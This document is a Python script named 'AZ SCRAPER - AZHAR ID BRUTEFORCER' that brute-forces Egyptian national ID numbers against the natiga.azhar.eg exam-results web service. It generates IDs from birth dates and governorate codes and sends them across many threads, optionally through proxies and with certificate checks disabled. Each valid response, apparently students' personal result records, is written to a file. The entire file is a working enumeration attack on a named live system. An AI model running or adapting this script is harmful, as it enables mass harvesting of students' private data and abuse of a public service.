#!/usr/bin/env python3

import requests
import json
import time
import urllib3
import threading
import logging
from queue import Queue, Empty
import argparse
import signal
import sys
import os
from tqdm import tqdm
from threading import Lock
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Global progress tracking
progress_bar = None
stats_lock = Lock()
stats = {
    'processed': 0,
    'found': 0,
    'errors': 0,
    'start_time': None
}

url = "https://natiga.azhar.eg/WebService1.asmx/GetNatiga2nd"

# Proxy configuration will be set via command line arguments
proxy = None

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0',
    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate, br',
    'Content-Type': 'application/json; charset=utf-8',
    'X-Requested-With': 'XMLHttpRequest',
    'Origin': 'https://natiga.azhar.eg',
    'Referer': 'https://natiga.azhar.eg/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'Dnt': '1',
    'Sec-Gpc': '1',
    'Priority': 'u=0',
    'Te': 'trailers',
    'Connection': 'keep-alive'
}

def generate_item_id(base_value, bruted_value):
    idset = 30
    return f'{idset}{base_value}{bruted_value}'

def send_post_request(bruted_value, base_value, use_proxy=None, max_retries=20):
    item_id = generate_item_id(base_value, bruted_value)
    payload = json.dumps({'ItemId': item_id})
    
    retries = 0
    while retries < max_retries:
        try:
            # Use proxy if provided, otherwise make direct request
            if use_proxy:
                response = requests.post(url, headers=headers, data=payload, verify=False, proxies=use_proxy, timeout=(5, 15))
            else:
                response = requests.post(url, headers=headers, data=payload, verify=False, timeout=(5, 15))
            response.raise_for_status()
            return response
        except requests.exceptions.HTTPError as e:
            pass
        except requests.exceptions.ConnectionError as e:
            pass
        except requests.exceptions.Timeout as e:
            pass
        except requests.exceptions.RequestException as e:
            retries += 1
            time.sleep(1)
    
    return None

def worker(queue, lock, output_file, stop_event, use_proxy=None):
    global progress_bar, stats, stats_lock
    
    while not stop_event.is_set():
        try:
            task = queue.get(timeout=0.1)
            if task is None or stop_event.is_set():  # Shutdown signal or stop event
                queue.task_done()
                break
            
            base_value, bruted_value = task
            item_id = generate_item_id(base_value, bruted_value)
            
            try:
                response = send_post_request(bruted_value, base_value, use_proxy)
                found_valid = False
                
                if response and response.status_code == 200:
                    json_data = response.json()
                    if json_data.get('d') is not None:
                        output_data = {
                            'item_id': item_id,
                            'base_date': base_value,
                            'response': json_data
                        }
                        with lock:
                            with open(output_file, 'a', encoding='utf-8') as file:
                                json.dump(output_data, file, ensure_ascii=False, indent=4)
                                file.write('\n')
                        found_valid = True
                        
                        # Update progress bar description with found ID
                        if progress_bar:
                            progress_bar.write(f"\n✅ FOUND VALID ID: {item_id} (Date: {base_value})")
                
                # Update statistics
                with stats_lock:
                    stats['processed'] += 1
                    if found_valid:
                        stats['found'] += 1
                    
                    # Update progress bar
                    if progress_bar:
                        elapsed = time.time() - stats['start_time']
                        rate = stats['processed'] / elapsed if elapsed > 0 else 0
                        progress_bar.set_postfix({
                            'Found': stats['found'],
                            'Errors': stats['errors'],
                            'Rate': f'{rate:.1f}/s'
                        })
                        progress_bar.update(1)
                        
            except Exception as e:
                with stats_lock:
                    stats['errors'] += 1
                    stats['processed'] += 1
                    if progress_bar:
                        elapsed = time.time() - stats['start_time']
                        rate = stats['processed'] / elapsed if elapsed > 0 else 0
                        progress_bar.set_postfix({
                            'Found': stats['found'],
                            'Errors': stats['errors'],
                            'Rate': f'{rate:.1f}/s'
                        })
                        progress_bar.update(1)
            
            queue.task_done()
        except Empty:
            continue

def ValidateDateOfBirth(value):
    ivalue = int(value)
    if len(value) != 5 or ivalue < 0:
        raise argparse.ArgumentTypeError(
            "Date of Birth (-dob) must be a 5-digit number like -dob 60101"
        )
    return ivalue

def ValidateYear(value):
    ivalue = int(value)
    if ivalue < 1950 or ivalue > 2030:
        raise argparse.ArgumentTypeError(
            "Year must be between 1950 and 2030"
        )
    return ivalue

def ValidateMonth(value):
    ivalue = int(value)
    if ivalue < 1 or ivalue > 12:
        raise argparse.ArgumentTypeError(
            "Month must be between 1 and 12"
        )
    return ivalue

def ValidateGovId(value):
    """Validate governorate ID"""
    valid_gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
    if value not in valid_gov_ids:
        raise argparse.ArgumentTypeError(
            f"Invalid governorate ID '{value}'. Valid IDs are: {', '.join(valid_gov_ids)}"
        )
    return value

def get_governorate_name(gov_id):
    """Get governorate name from ID (for display purposes)"""
    gov_names = {
        '01': 'Cairo', '02': 'Alexandria', '03': 'Port Said', '04': 'Suez',
        '11': 'Damietta', '12': 'Dakahlia', '13': 'Sharqia', '14': 'Qalyubia',
        '15': 'Kafr el-Sheikh', '16': 'Gharbia', '17': 'Monufia', '18': 'Beheira',
        '19': 'Ismailia', '21': 'Giza', '23': 'Beni Suef', '24': 'Fayyum',
        '25': 'Minya', '26': 'Asyut', '27': 'Sohag', '28': 'Qena',
        '29': 'Aswan', '31': 'Luxor', '32': 'Red Sea', '33': 'New Valley',
        '34': 'Matrouh', '35': 'North Sinai', '88': 'South Sinai'
    }
    return gov_names.get(gov_id, f'Unknown ({gov_id})')

def generate_dates_for_month(year, month):
    """Generate all possible dates for a given year and month"""
    # Days in each month (non-leap year)
    days_in_month = [31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31]
    
    # Check for leap year
    if month == 2 and ((year % 4 == 0 and year % 100 != 0) or (year % 400 == 0)):
        max_days = 29
    else:
        max_days = days_in_month[month - 1]
    
    dates = []
    year_digit = year % 10  # Get last digit of year
    
    for day in range(1, max_days + 1):
        date_str = f"{year_digit}{month:02d}{day:02d}"
        dates.append(int(date_str))
    
    return dates

def generate_dates_for_year(year):
    """Generate all possible dates for an entire year (all months and days)"""
    all_dates = []
    for month in range(1, 13):  # All 12 months
        month_dates = generate_dates_for_month(year, month)
        all_dates.extend(month_dates)
    return sorted(all_dates)

def display_startup_info(gov_ids, base_values, threads, output_file, total_requests, date_info, proxy_config):
    print("=" * 60)
    print("          AZ SCRAPER - AZHAR ID BRUTEFORCER")
    print("=" * 60)
    print(f"[*] Target Service: AZHAR Education Portal")
    print(f"[*] Company/Service URL: https://natiga.azhar.eg/")
    print(f"[*] API Endpoint: WebService1.asmx/GetNatiga2nd")
    print(f"[*] Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("-" * 60)
    print("CONFIGURATION:")
    print(f"[*] Date Strategy: {date_info}")
    if len(base_values) == 1:
        print(f"[*] Single Date (YMMDD): {base_values[0]}")
    else:
        print(f"[*] Date Range: {base_values[0]} to {base_values[-1]}")
        print(f"[*] Total Dates: {len(base_values):,}")
        
        # Show sample dates for large ranges
        if len(base_values) > 10:
            sample_dates = base_values[:5] + ['...'] + base_values[-5:]
            print(f"[*] Sample Dates: {', '.join(map(str, sample_dates))}")
    
    print(f"[*] Governorates: {', '.join([f'{gid}({get_governorate_name(gid)})' for gid in gov_ids])}")
    print(f"[*] Governorate Count: {len(gov_ids)}")
    print(f"[*] Threads: {threads}")
    print(f"[*] Output File: {output_file}")
    print(f"[*] Total Requests: {total_requests:,}")
    if len(base_values) > 1:
        print(f"[*] Requests per Date: {100000 * len(gov_ids):,}")
        print(f"[*] Requests per Governorate: {100000 * len(base_values):,}")
    print("-" * 60)
    print("PROXY CONFIGURATION:")
    if proxy_config:
        print(f"[*] HTTP Proxy: {proxy_config.get('http', 'Not set')}")
        print(f"[*] HTTPS Proxy: {proxy_config.get('https', 'Not set')}")
        print(f"[*] Proxy Status: ✅ ENABLED")
    else:
        print(f"[*] Proxy Status: ❌ DISABLED (Direct connection)")
        print(f"[*] Note: Use --proxy to enable proxy support")
    print("=" * 60)
    print("[+] Starting bruteforce attack...")
    print("=" * 60)

def signal_handler(sig, frame):
    global progress_bar, stats, stop_event
    
    print("\n\n🛑 Interrupt signal received (Ctrl+C)...")
    print("📊 Stopping gracefully and saving progress...")
    
    # Set stop event to signal all threads to stop
    if 'stop_event' in globals():
        stop_event.set()
    
    # Close progress bar cleanly
    if progress_bar:
        progress_bar.close()
    
    # Display final statistics if available
    if stats and stats.get('start_time'):
        elapsed = time.time() - stats['start_time']
        print(f"\n📈 Session Statistics:")
        print(f"   ⏱️  Runtime: {elapsed:.2f} seconds")
        print(f"   🔍 Processed: {stats['processed']:,} requests")
        print(f"   ✅ Found: {stats['found']} valid IDs")
        print(f"   ❌ Errors: {stats['errors']}")
        if elapsed > 0:
            print(f"   ⚡ Rate: {stats['processed']/elapsed:.1f} requests/second")
    
    print("\n👋 Session terminated by user. Results saved to output file.")
    print("💡 Tip: You can resume by running the same command again.")
    
    # Force exit
    os._exit(0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SCRIPT TO BRUTEFORCE EG-ID IN AZHAR.")
    
    # Date input arguments (either exact date OR year OR year+month)
    parser.add_argument('-dob', type=ValidateDateOfBirth, help='Full date of Birth YMMDD like 70304 (-dob 70304)')
    parser.add_argument('-y', '--year', type=ValidateYear, help='Birth year like -y 2007 (will brute all months/days) or combine with -m for specific month')
    parser.add_argument('-m', '--month', type=ValidateMonth, help='Birth month like -m 3 (for March) - must be used with -y/--year')
    
    # Proxy configuration
    parser.add_argument('--proxy', type=str, help='Proxy URL (e.g., --proxy http://127.0.0.1:8080). If not specified, direct connection will be used.')
    parser.add_argument('--proxy-https', type=str, help='HTTPS proxy URL (optional, uses --proxy value if not specified)')
    
    parser.add_argument('-g', '--gov', type=ValidateGovId, nargs='+', 
                       help='Specific governorate ID(s) to test (e.g., -g 01 12 for Cairo and Dakahlia). If not specified, all governorates will be tested.')
    parser.add_argument('-o', '--file', type=str, default='valid_responses.json', help='Output to save results.')
    parser.add_argument('-t', '--threads', type=int, default='50', help='Threads.')
    args = parser.parse_args()
    
    # Configure proxy settings
    proxy_config = None
    if args.proxy:
        proxy_config = {
            "http": args.proxy,
            "https": args.proxy_https if args.proxy_https else args.proxy
        }
        print(f"[*] Proxy configured: {proxy_config['http']}")
        if args.proxy_https and args.proxy_https != args.proxy:
            print(f"[*] HTTPS Proxy: {proxy_config['https']}")
    else:
        print(f"[*] No proxy configured - using direct connection")

    # Validate argument combinations
    if args.dob and (args.year or args.month):
        parser.error("Cannot use -dob with -y/--year or -m/--month. Choose either:\n  - Exact date: -dob 70315\n  - Year only: -y 2007 (all months)\n  - Year+month: -y 2007 -m 3")
    
    if not args.dob and not args.year:
        parser.error("You must provide either:\n  - Exact date: -dob 70315\n  - Year only: -y 2007 (brutes all months/days)\n  - Year+month: -y 2007 -m 3 (brutes all days in March 2007)")
    
    if args.month and not args.year:
        parser.error("Month (-m/--month) can only be used together with year (-y/--year).")
    
    # Determine base values to use
    if args.dob:
        base_values = [args.dob]
        date_info = f"single date: {args.dob}"
    elif args.year and args.month:
        # Year + specific month
        year = args.year
        month = args.month
        base_values = generate_dates_for_month(year, month)
        month_names = ['Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', 'Dec']
        date_info = f"year {year}, month {month} ({month_names[month-1]}) - {len(base_values)} dates"
    else:
        # Year only - all months and days
        year = args.year
        base_values = generate_dates_for_year(year)
        date_info = f"entire year {year} - {len(base_values)} dates across all months"
    
    print(f"[*] Using {date_info}")
    if len(base_values) > 1:
        print(f"[*] Date range: {base_values[0]} to {base_values[-1]}")
    
    output_file = args.file
    
    # Determine which gov_ids to use
    all_gov_ids = ['12', '02', '03', '04', '11', '01', '13', '14', '15', '16', '17', '18', '19', '21', '23', '24', '25', '26', '27', '28', '29', '31', '32', '33', '34', '35', '88']
    
    if args.gov:
        gov_ids = args.gov
    else:
        gov_ids = all_gov_ids
    
    # Calculate total requests
    total_requests = len(base_values) * len(gov_ids) * 100000
    
    # Display startup information
    display_startup_info(gov_ids, base_values, args.threads, output_file, total_requests, date_info, proxy_config)
    
    queue = Queue()
    lock = threading.Lock()
    stop_event = threading.Event()

    num_threads = args.threads

    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=worker, args=(queue, lock, output_file, stop_event, proxy_config))
        thread.start()
        threads.append(thread)

    # Register signal handlers for graceful shutdown
    signal.signal(signal.SIGINT, signal_handler)  # Ctrl+C
    if hasattr(signal, 'SIGTERM'):
        signal.signal(signal.SIGTERM, signal_handler)  # Termination signal
    
    print(f"[*] Press Ctrl+C to stop gracefully at any time")
    print(f"[*] All results will be saved before shutdown")
    print()
    
    # Determine which governorates to test
    if args.gov:
        print(f"[*] Using specific governorate(s): {', '.join([f'{gid} ({get_governorate_name(gid)})' for gid in gov_ids])}")
    else:
        print(f"[*] Using all {len(gov_ids)} governorates (use -g to specify specific ones)")
    
    print(f"[*] Starting brute force with {num_threads} threads...")
    print(f"[*] Testing {len(base_values)} date(s) across {len(gov_ids)} governorate(s)")
    
    total_combinations = len(base_values) * len(gov_ids) * 100000
    print(f"[*] Total combinations to test: {total_combinations:,}")
    print(f"[*] Output file: {output_file}")
    print()
    
    # Initialize progress tracking
    stats['start_time'] = time.time()
    
    # Create progress bar
    progress_bar = tqdm(
        total=total_combinations,
        desc="🔍 Scanning IDs",
        unit="req",
        unit_scale=True,
        bar_format="{l_bar}{bar}| {n_fmt}/{total_fmt} [{elapsed}<{remaining}, {rate_fmt}] {postfix}",
        postfix={'Found': 0, 'Errors': 0, 'Rate': '0.0/s'}
    )
    
    try:
        # Queue all tasks
        for base_value in base_values:
            for prefix in gov_ids:
                for i in range(100000):
                    bruted_value = f'{prefix}{i:05}'
                    queue.put((base_value, bruted_value))

        # Wait for completion
        queue.join()
        
    finally:
        # Cleanup
        stop_event.set()
        for _ in range(num_threads):
            queue.put(None)
        for thread in threads:
            thread.join()
        
        # Close progress bar
        if progress_bar:
            progress_bar.close()
        
        # Final statistics
        elapsed = time.time() - stats['start_time']
        print(f"\n📊 Final Statistics:")
        print(f"   ⏱️  Total time: {elapsed:.2f} seconds")
        print(f"   🔍 Total processed: {stats['processed']:,}")
        print(f"   ✅ Valid IDs found: {stats['found']}")
        print(f"   ❌ Errors: {stats['errors']}")
        print(f"   ⚡ Average rate: {stats['processed']/elapsed:.1f} requests/second")
        if stats['found'] > 0:
            print(f"   🎯 Success rate: {(stats['found']/stats['processed']*100):.6f}%")

    print(f"[+] BRUTE FORCE COMPLETED => {output_file}")